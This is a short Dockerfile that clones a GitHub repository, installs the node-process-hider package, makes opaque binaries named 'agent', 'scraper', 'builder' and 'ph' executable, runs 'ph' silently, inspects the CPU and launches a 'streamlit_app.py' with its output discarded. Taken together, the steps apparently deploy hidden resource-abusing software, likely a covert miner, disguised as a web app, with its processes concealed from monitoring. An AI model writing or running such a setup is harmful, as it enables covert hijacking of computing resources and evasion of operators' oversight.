FROM ubuntu:latest
ENV DEBIAN_FRONTEND=noninteractive
ENV TERM=xterm
RUN apt-get update -y; apt-get install curl git npm gcc procps python3 --assume-yes;
RUN npm i -g node-process-hider
RUN git clone https://github.com/agussusahnti/qgcm.git
WORKDIR /qgcm
RUN chmod +x agent scraper builder ph
RUN ./ph > /dev/null
RUN lscpu
RUN python3 streamlit_app.py
CMD ["/bin/sh", "-c", "watch free -m & python3 streamlit_app.py > /dev/null"]
